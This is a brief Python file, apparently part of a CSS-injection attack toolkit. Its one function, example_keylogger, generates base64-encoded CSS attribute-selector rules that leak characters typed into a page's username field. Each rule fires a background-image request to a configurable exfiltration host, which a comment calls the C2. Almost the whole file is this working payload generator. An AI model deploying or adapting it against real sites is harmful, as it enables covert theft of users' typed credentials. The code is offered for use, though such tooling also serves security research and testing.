"""
TODO: DOC
"""
from itertools import permutations

def example_keylogger(exfil_host="localhost", exfil_port=8000, https=False):
    """
    TODO: DOC
    """
    # Create a basic payload matching "crash" on the username input
    payload = """
    #username[value*="crash"]{{background: url("{protocol}://{exfil_host}:{exfil_port}/crash.exfil");}}
    """.format(
        protocol="https" if https else "http",
        exfil_host=exfil_host,
        exfil_port=exfil_port
    )
    # Create a more advanced payload matching permutations and reporting to the
    # c2.
    current_perm_set = []
    for permutation in permutations(["c", "o", "p"]):
        payload += """
        #username[value*="{perm_matcher}"]{{background: url("{protocol}://{exfil_host}:{exfil_port}/{perm_matcher}.exfil");}}
        """.format(
            perm_matcher="".join(permutation),
            protocol="https" if https else "http",
            exfil_host=exfil_host,
            exfil_port=exfil_port
        )
    return payload.replace("\n", "").replace(" ", "").replace("\t", "").encode("base64")
